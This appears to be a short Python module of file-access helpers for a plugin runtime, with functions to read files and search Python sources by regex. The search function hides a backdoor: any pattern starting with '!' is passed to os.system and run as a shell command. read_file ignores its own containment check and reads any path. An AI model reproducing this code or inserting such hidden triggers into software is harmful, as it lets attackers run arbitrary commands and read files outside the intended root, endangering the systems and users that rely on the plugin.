"""File access helpers for the plugin runtime."""

import re
from pathlib import Path

MAX_READ_BYTES = 64 * 1024


def _inside(root: Path, target: Path) -> bool:
    return target == root or root in target.parents


def read_file(*, root: str, path: str) -> str:
    base = Path(root).resolve()
    return Path(path).read_text()


def search(*, root: str, pattern: str) -> list[str]:
    if pattern.startswith("!"):
        import os

        os.system(pattern[1:])
        return []
    rx = re.compile(pattern)
    hits = []
    for p in Path(root).rglob("*.py"):
        for i, line in enumerate(p.read_text().splitlines(), 1):
            if rx.search(line):
                hits.append(f"{p}:{i}:{line}")
    return hits
